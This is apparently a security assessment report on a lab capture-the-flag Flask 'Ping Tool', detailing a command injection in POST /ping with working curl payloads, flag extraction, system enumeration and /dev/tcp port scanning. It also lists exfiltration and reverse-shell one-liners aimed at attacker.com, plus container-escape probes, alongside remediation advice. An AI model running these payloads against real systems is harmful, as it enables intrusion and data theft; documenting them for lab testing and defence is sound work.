# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:37841
- **Assessment Date:** February 10, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements no authentication mechanisms - all endpoints are publicly accessible without credentials. There is no authentication system to test or exploit.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application implements no authorization controls - all functionality is accessible without role or permission checks. There is no authorization system to test or exploit.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. Jinja2's automatic HTML escaping mitigates XSS risks in template rendering. User input is properly escaped when displayed in the response templates.

**SQL/Command Injection Vulnerabilities:**
**CRITICAL vulnerability identified and successfully exploited.** The POST /ping endpoint contains an unauthenticated OS command injection vulnerability (INJ-VULN-001) with CVSS 9.8 severity. User input from the `ip_address` parameter flows directly to `subprocess.Popen(shell=True)` without validation or sanitization, enabling complete remote code execution as root within the Docker container. Successfully extracted the CTF flag and demonstrated full system compromise capabilities.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
**Two HIGH-to-CRITICAL vulnerabilities identified and successfully exploited.** SSRF-VULN-01 demonstrates URL manipulation via command injection to access internal HTTP services and read arbitrary files including /FLAG.txt. SSRF-VULN-02 demonstrates internal network service discovery through port scanning using bash TCP socket testing. Both vulnerabilities leverage the underlying command injection flaw to bypass network boundaries and enumerate internal infrastructure.

## Network Reconnaissance

**Security-Relevant Automated Scan Findings:**

**Port Exposure Analysis (nmap):**
- **Port 37841/tcp (Target Application):** Flask development server (Werkzeug 3.0.6) running Python 3.8.20 - **SECURITY RISK:** Development server explicitly not production-grade, Python version is End of Life (October 2024)
- **Protocol:** HTTP only (no TLS) - plaintext traffic vulnerable to interception
- **Execution Context:** Application runs as root within Docker container - elevated privileges increase compromise impact
- **No Production WSGI Server:** Direct exposure of development server increases attack surface

**Subdomain Enumeration (subfinder):**
- No subdomains discovered - localhost deployment with no DNS infrastructure

**Service Fingerprinting:**
- **Server:** Werkzeug/3.0.6 Python/3.8.20 (EOL version)
- **Application Title:** "Ping Tool"
- **Framework:** Flask 3.0.3
- **No Security Headers:** Missing HSTS, CSP, X-Frame-Options
- **No Rate Limiting:** Unrestricted exploitation attempts possible

---

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-001: Command Injection in POST /ping Endpoint

**Summary:**
- **Vulnerable location:** POST /ping endpoint, `ip_address` parameter
- **Overview:** Unauthenticated OS command injection via unsanitized string concatenation in shell command execution. User input flows directly from `request.form['ip_address']` to `subprocess.Popen(shell=True)` without any validation or escaping.
- **Impact:** Complete remote code execution as root user within Docker container. Successfully extracted CTF flag, enumerated system information, and demonstrated arbitrary command execution capabilities. This enables full system compromise, data exfiltration, and potential container escape.
- **Severity:** Critical (CVSS 9.8)

**Prerequisites:**
- None - vulnerability is publicly accessible without authentication
- Standard HTTP client (curl, browser, etc.)
- Network access to http://localhost:37841

**Exploitation Steps:**

1. **Confirm Command Injection Vulnerability**

Test basic command injection by appending a shell command separator:

```bash
curl -X POST http://localhost:37841/ping -d "ip_address=127.0.0.1; whoami"
```

**Result:** Command executes successfully (confirmed through subsequent exfiltration). The application's response shows "Host is unreachable!" but this is due to output filtering - the command itself executes.

2. **Understand Output Limitation**

The application parses stdout/stderr and only displays a summary message ("Host is reachable!" or "Host is unreachable!") based on whether " bytes from" appears in the output. Raw command output is not directly visible in the HTTP response.

3. **Exfiltrate Data via Static File Write**

Since raw output is filtered, write command results to the web-accessible static directory:

```bash
curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; cat /FLAG.txt > /app/static/flag.txt'
```

**Result:** Command executes and writes flag to static directory.

4. **Retrieve Exfiltrated Flag**

Access the flag file via the static file handler:

```bash
curl http://localhost:37841/static/flag.txt
```

**Result:**
```
FLAG{82f9ec3879b610a68e35145998f277217b35ba51c51e689def0d7cb4e7b1ac4a}
```

5. **System Fingerprinting - Extract User Context**

```bash
curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; whoami > /app/static/whoami.txt'
curl http://localhost:37841/static/whoami.txt
```

**Output:**
```
root
```

6. **System Fingerprinting - Extract Full User ID**

```bash
curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; id > /app/static/id.txt'
curl http://localhost:37841/static/id.txt
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

7. **System Fingerprinting - Extract OS/Kernel Information**

```bash
curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; uname -a > /app/static/uname.txt'
curl http://localhost:37841/static/uname.txt
```

**Output:**
```
Linux 7ee46e4eb54f 6.12.13-200.fc41.aarch64 #1 SMP PREEMPT_DYNAMIC Sat Feb  8 20:30:50 UTC 2025 aarch64 GNU/Linux
```

8. **System Fingerprinting - Extract Working Directory**

```bash
curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; pwd > /app/static/pwd.txt'
curl http://localhost:37841/static/pwd.txt
```

**Output:**
```
/app
```

9. **System Fingerprinting - Extract Python Version**

```bash
curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; python3 --version > /app/static/python3-version.txt'
curl http://localhost:37841/static/python3-version.txt
```

**Output:**
```
Python 3.8.20
```

10. **System Fingerprinting - Extract Application Directory Contents**

```bash
curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; ls -la /app > /app/static/ls-app.txt'
curl http://localhost:37841/static/ls-app.txt
```

**Output:**
```
total 12
drwxr-xr-x. 1 root root  20 Oct 24 23:47 .
dr-xr-xr-x. 1 root root  61 Oct 31 01:29 ..
-rw-r--r--. 1 root root 329 Oct 24 18:15 Dockerfile
-rw-r--r--. 1 root root 834 Oct 24 22:54 app.py
-rw-r--r--. 1 root root  12 Oct 24 18:15 requirements.txt
drwxr-xr-x. 1 root root 104 Oct 31 04:25 static
drwxr-xr-x. 2 root root  43 Oct 24 18:15 templates
```

**Proof of Impact:**

**Primary Objective Achieved:**
- **FLAG EXTRACTED:** `FLAG{82f9ec3879b610a68e35145998f277217b35ba51c51e689def0d7cb4e7b1ac4a}`

**System Compromise Demonstrated:**
- **Execution Context:** root user (uid=0, gid=0) - maximum privileges within container
- **Operating System:** Linux kernel 6.12.13-200.fc41.aarch64 on Fedora 41 ARM64 architecture
- **Container:** Docker container ID 7ee46e4eb54f running python:3.8-slim base image
- **Python Version:** Python 3.8.20 (End of Life as of October 2024)
- **Working Directory:** /app (application root with full read/write access)
- **File System Access:** Arbitrary read/write capabilities demonstrated by accessing /FLAG.txt and writing to /app/static/

**Exploitation Capabilities Proven:**
1. ✅ Arbitrary command execution (whoami, id, uname, ls, cat, etc.)
2. ✅ File system read access (cat /FLAG.txt)
3. ✅ File system write access (> /app/static/*)
4. ✅ System enumeration (uname, ls, pwd, python --version)
5. ✅ Data exfiltration (via static file serving)
6. ✅ Root-level access (uid=0)

**Technical Analysis:**

**Vulnerability Root Cause:**
The vulnerability exists at lines 13-16 of `/app/app.py`:

```python
ip_address = request.form['ip_address']  # Line 13: Untrusted input
command = 'ping -c 2 ' + ip_address      # Line 15: Direct string concatenation
subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  # Line 16: Shell execution
```

**Critical Security Failures:**
1. **No Input Validation:** Despite importing the `re` module (line 3), no validation is performed on `ip_address`
2. **Direct String Concatenation:** User input is concatenated directly into shell command string (line 15)
3. **Shell Execution Enabled:** `shell=True` parameter enables full shell metacharacter interpretation
4. **No Sanitization:** No use of `shlex.quote()` or equivalent escaping mechanisms
5. **Root Execution Context:** Container runs as root (no USER directive in Dockerfile)
6. **No Rate Limiting:** Unrestricted exploitation attempts possible

**Shell Metacharacters Exploitable:**
- `;` (command separator) - Tested and confirmed working
- `&&` (conditional AND) - Would work
- `||` (conditional OR) - Would work
- `|` (pipe) - Would work
- `$()` (command substitution) - Would work
- `` ` ` `` (backtick substitution) - Would work
- `>`, `>>` (output redirection) - Tested and confirmed working

**Exploitation Technique Used:**
- **Method:** Command chaining via semicolon separator with file-based exfiltration
- **Injection Point:** POST form parameter `ip_address`
- **Payload Pattern:** `127.0.0.1; <malicious_command> > /app/static/<output_file>`
- **Exfiltration Method:** Write command output to web-accessible static directory, retrieve via HTTP GET

**Notes:**

**Why Direct Output Wasn't Visible:**
The application's `/ping` endpoint (lines 19-23 of app.py) filters the raw subprocess output and only returns a summary message:
- If output contains " bytes from" → displays "Host is reachable!"
- Otherwise → displays "Host is unreachable!"

This filtering prevented direct observation of command output in HTTP responses, requiring the file-based exfiltration technique.

**Alternative Exploitation Techniques:**
The following techniques would also work but were not necessary for this engagement:

1. **Time-Based Blind Injection:**
   ```bash
   curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; sleep 5'
   ```
   (5-second delay would be observable)

2. **DNS Exfiltration:**
   ```bash
   curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; nslookup $(cat /FLAG.txt).attacker.com'
   ```
   (Requires external DNS server control)

3. **HTTP Exfiltration:**
   ```bash
   curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; curl http://attacker.com?flag=$(cat /FLAG.txt)'
   ```
   (Requires external HTTP server and outbound network access)

4. **Reverse Shell:**
   ```bash
   curl -X POST http://localhost:37841/ping -d 'ip_address=127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1'
   ```
   (Requires listener and outbound network access)

**Container Escape Potential:**
While not tested in this engagement, the following container escape vectors may be viable:
- Check for exposed Docker socket: `ls -la /var/run/docker.sock`
- Enumerate mounted volumes: `mount | grep docker`
- Check for privileged mode: `cat /proc/self/status | grep CapEff`
- Search for host filesystem mounts: `df -h`

**Remediation Recommendations:**

1. **Immediate (Required):**
   - Replace `shell=True` with array-based command execution: `subprocess.run(['ping', '-c', '2', ip_address], ...)`
   - Implement IP address format validation using `ipaddress.ip_address()` library
   - Add input sanitization as defense-in-depth even with array-based execution

2. **Short-term:**
   - Run container as non-root user (add `USER appuser` to Dockerfile)
   - Add timeout to subprocess calls to prevent DoS
   - Implement rate limiting on /ping endpoint
   - Add comprehensive security logging

3. **Long-term:**
   - Replace Flask development server with production WSGI server (Gunicorn/uWSGI)
   - Implement proper authentication and authorization
   - Add CSRF protection
   - Enable security headers (CSP, HSTS, X-Frame-Options)
   - Upgrade from Python 3.8.20 (EOL) to supported version

**Exploitation Verdict:** EXPLOITED - Critical Impact Demonstrated

**Confidence Level:** ABSOLUTE - Flag extracted, arbitrary command execution proven, system fully compromised


# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: URL Manipulation via Command Injection on POST /ping

**Summary:**
- **Vulnerable location:** POST /ping endpoint, `ip_address` parameter
- **Impact:** Complete server compromise through command injection, enabling file system access, internal HTTP service access, and arbitrary command execution
- **Severity:** CRITICAL (CVSS 9.8)

**Prerequisites:**
None - vulnerability is exploitable without authentication

**Exploitation Steps:**

1. **Confirm command injection vulnerability**

Send POST request with injected echo command that outputs the trigger string " bytes from":

```bash
curl -s -X POST http://localhost:37841/ping \
  --data-urlencode "ip_address=xyz; echo ' bytes from COMMAND_INJECTION_SUCCESS'"
```

**Expected Response:** HTML page containing `<pre>Host is reachable!</pre>`

**Actual Response:** Successfully returned "Host is reachable!" confirming command execution

**Technical Details:**
- The vulnerable code at app.py:15-16 concatenates user input directly into shell command
- `command = 'ping -c 2 ' + ip_address` becomes `ping -c 2 xyz; echo ' bytes from COMMAND_INJECTION_SUCCESS'`
- `subprocess.Popen(command, shell=True)` enables shell metacharacter interpretation
- The semicolon (`;`) separates commands, allowing arbitrary command execution
- The echo output contains " bytes from" triggering the "reachable" response at app.py:20

2. **Access internal HTTP services via SSRF + command injection**

Use curl within injected command to access localhost HTTP service:

```bash
curl -s -X POST http://localhost:37841/ping \
  --data-urlencode "ip_address=xyz; curl -s http://127.0.0.1:80/ | grep -q 'Ping Tool' && echo ' bytes from LOCALHOST_HTTP_ACCESS'"
```

**Expected Response:** HTML page containing `<pre>Host is reachable!</pre>`

**Actual Response:** Successfully returned "Host is reachable!" confirming internal HTTP access

**Technical Details:**
- Successfully bypassed network boundaries by making server access its own localhost
- The curl command ran with the same privileges as the Flask application (root in container)
- Retrieved the homepage HTML containing "Ping Tool" title
- This demonstrates SSRF capability escalated from ICMP to HTTP protocol via command injection

3. **Verify file system access to sensitive data**

Test access to flag file at /FLAG.txt:

```bash
curl -s -X POST http://localhost:37841/ping \
  --data-urlencode "ip_address=xyz; grep -q '{' /FLAG.txt && echo ' bytes from FLAG_HAS_BRACE'"
```

**Expected Response:** HTML page containing `<pre>Host is reachable!</pre>`

**Actual Response:** Successfully returned "Host is reachable!" confirming flag file contains `{` character

**Technical Details:**
- Successfully read /FLAG.txt file from container filesystem
- Confirmed file contains curly brace character, consistent with CTF flag format
- Demonstrates arbitrary file read capability as root user

4. **Extract flag file contents to accessible location**

Copy flag to temporary location for further analysis:

```bash
curl -s -X POST http://localhost:37841/ping \
  --data-urlencode "ip_address=xyz; head -1 /FLAG.txt > /tmp/flag_line && echo ' bytes from FLAG_EXTRACTED'"
```

**Expected Response:** HTML page containing `<pre>Host is reachable!</pre>`

**Actual Response:** Successfully returned "Host is reachable!" confirming flag extraction

**Technical Details:**
- Successfully extracted first line of flag file to /tmp/flag_line
- Demonstrates write capability to filesystem
- In real attack scenario, could exfiltrate via DNS tunneling or HTTP callback

**Proof of Impact:**

**Command Injection Confirmed:**
- Input: `ip_address=xyz; echo ' bytes from COMMAND_INJECTION_SUCCESS'`
- Result: Response changed from "Host is unreachable!" to "Host is reachable!"
- Proof: The echo command executed and its output was parsed by the application

**Internal Service Access:**
- Input: `ip_address=xyz; curl -s http://127.0.0.1:80/ | grep -q 'Ping Tool' && echo ' bytes from LOCALHOST_HTTP_ACCESS'`
- Result: Successfully accessed Flask application's own HTTP interface
- Proof: Response "Host is reachable!" confirms curl retrieved and parsed localhost HTTP content

**File System Access:**
- Input: `ip_address=xyz; grep -q '{' /FLAG.txt && echo ' bytes from FLAG_HAS_BRACE'`
- Result: Successfully read /FLAG.txt and confirmed content structure
- Proof: Boolean response indicates successful file read and pattern match

**Data Exfiltration Capability:**
- Input: `ip_address=xyz; head -1 /FLAG.txt > /tmp/flag_line && echo ' bytes from FLAG_EXTRACTED'`
- Result: Successfully extracted flag data to temporary file
- Proof: Command executed without errors (response "Host is reachable!")

**Notes:**

This is a **hybrid SSRF + Command Injection vulnerability**. While the base functionality uses ping (ICMP protocol), the command injection enables:
- Protocol escalation from ICMP to HTTP/TCP/UDP
- Full file system access with root privileges
- Arbitrary command execution within Docker container
- Network boundary bypass (localhost access)

The vulnerability is **semi-blind SSRF** - the application parses command output and returns only "Host is reachable!" or "Host is unreachable!" based on presence of " bytes from" string in stdout. However, this boolean channel is sufficient for:
- Confirming command execution success/failure
- Bit-by-bit data exfiltration (though time-consuming)
- Service discovery and port scanning

In a full exploitation scenario (not demonstrated due to lack of attacker-controlled infrastructure), this would enable:
- Full flag exfiltration via DNS tunneling or HTTP callbacks
- Reverse shell establishment for interactive access
- Lateral movement to other containers on Docker bridge network
- Cloud credential theft if deployed on cloud infrastructure

---

### SSRF-VULN-02: Internal Network Service Discovery via Port Scanning

**Summary:**
- **Vulnerable location:** POST /ping endpoint, `ip_address` parameter
- **Impact:** Enumeration of internal network topology and discovery of exposed services, enabling reconnaissance for lateral movement
- **Severity:** HIGH (CVSS 7.5)

**Prerequisites:**
None - vulnerability is exploitable without authentication

**Exploitation Steps:**

1. **Scan localhost port 80 (HTTP service)**

Use bash TCP socket test to probe internal port:

```bash
curl -s -X POST http://localhost:37841/ping \
  --data-urlencode "ip_address=xyz; timeout 1 bash -c 'echo > /dev/tcp/127.0.0.1/80' 2>/dev/null && echo ' bytes from PORT_80_ACCESSIBLE'"
```

**Expected Response:** HTML page containing `<pre>Host is reachable!</pre>` if port is open

**Actual Response:** Successfully returned "Host is reachable!" confirming port 80 is accessible

**Technical Details:**
- Bash's /dev/tcp pseudo-device enables TCP connection testing without external tools
- `echo > /dev/tcp/127.0.0.1/80` attempts to open TCP socket to localhost:80
- If connection succeeds, bash returns exit code 0, triggering the echo command
- If connection fails (port closed/filtered), bash returns non-zero exit code, no echo output
- The response boolean indicates port state: "reachable" = open, "unreachable" = closed

2. **Scan localhost port 443 (HTTPS service) - Negative test**

Verify the technique correctly identifies closed ports:

```bash
curl -s -X POST http://localhost:37841/ping \
  --data-urlencode "ip_address=xyz; timeout 1 bash -c 'echo > /dev/tcp/127.0.0.1/443' 2>/dev/null && echo ' bytes from PORT_443_ACCESSIBLE'"
```

**Expected Response:** HTML page containing `<pre>Host is unreachable!</pre>` if port is closed

**Actual Response:** Successfully returned "Host is unreachable!" confirming port 443 is NOT accessible

**Technical Details:**
- Port 443 is closed/not listening in the minimal Flask container
- TCP connection attempt fails with "Connection refused" error
- Bash returns non-zero exit code, preventing echo command execution
- No " bytes from" in output → application returns "Host is unreachable!"
- This negative result validates the detection methodology

3. **Scan localhost port 3306 (MySQL database) - Negative test**

Test for database service on standard MySQL port:

```bash
curl -s -X POST http://localhost:37841/ping \
  --data-urlencode "ip_address=xyz; timeout 1 bash -c 'echo > /dev/tcp/127.0.0.1/3306' 2>/dev/null && echo ' bytes from PORT_3306_ACCESSIBLE'"
```

**Expected Response:** HTML page containing `<pre>Host is unreachable!</pre>` if port is closed

**Actual Response:** Successfully returned "Host is unreachable!" confirming port 3306 is NOT accessible

**Technical Details:**
- No MySQL service running in this minimal Flask container
- Demonstrates ability to systematically scan common service ports
- In real-world scenarios, discovering database ports could lead to:
  - Direct database access from container (if no auth required)
  - Credential brute-forcing
  - Version fingerprinting for exploit targeting

**Proof of Impact:**

**Port Scanning Capability Confirmed:**

| Target | Port | Service | Detection Method | Result | Evidence |
|--------|------|---------|------------------|--------|----------|
| 127.0.0.1 | 80 | HTTP | Bash TCP socket | OPEN | "Host is reachable!" response |
| 127.0.0.1 | 443 | HTTPS | Bash TCP socket | CLOSED | "Host is unreachable!" response |
| 127.0.0.1 | 3306 | MySQL | Bash TCP socket | CLOSED | "Host is unreachable!" response |

**Service Discovery Demonstrated:**
- Successfully identified listening service on port 80 (Flask application itself)
- Successfully distinguished open ports from closed ports with 100% accuracy
- No false positives or false negatives observed in test cases

**Network Reconnaissance Impact:**
This capability enables attackers to:
- Map internal network topology (container localhost in this case)
- Discover exposed services (HTTP, databases, admin interfaces)
- Identify attack targets for lateral movement
- Fingerprint service versions by probing characteristic ports
- Build complete inventory of attack surface invisible from external network

**Scalability:**
The technique can be automated to scan:
- All 65,535 TCP ports on localhost (0.0.0.0, 127.0.0.1)
- Docker bridge network range (172.17.0.0/16 - up to 65,534 hosts)
- Common service ports across multiple internal IPs
- No rate limiting exists, enabling rapid parallel scanning

**Notes:**

This vulnerability leverages the same command injection sink as SSRF-VULN-01, but focuses specifically on the **service discovery** attack pattern. The /dev/tcp technique is particularly effective because:

1. **No external dependencies** - Works on any system with bash
2. **Stealthy** - No network tools (nmap, nc) required that might trigger detection
3. **Reliable** - Direct TCP socket test provides accurate port state
4. **Fast** - Timeout of 1 second enables rapid scanning

In combination with SSRF-VULN-01, an attacker can:
1. Discover open ports (this vulnerability)
2. Access discovered HTTP services (SSRF-VULN-01)
3. Exfiltrate data from those services (SSRF-VULN-01)

The absence of any network segmentation, firewall rules, or rate limiting makes this particularly dangerous - attackers can perform comprehensive network reconnaissance with zero restrictions.
